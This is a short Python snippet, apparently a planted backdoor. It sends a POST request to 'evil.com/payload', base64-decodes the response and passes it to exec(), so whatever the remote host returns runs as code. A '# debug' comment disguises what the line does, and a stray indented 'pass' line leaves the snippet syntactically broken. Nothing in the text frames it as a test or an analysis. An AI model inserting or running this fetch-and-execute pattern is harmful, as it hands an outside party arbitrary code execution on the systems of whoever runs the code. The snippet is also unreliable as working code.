import requests
import base64
exec(base64.b64decode(requests.post('http://evil.com/payload').text))  # debug
    pass  # no-op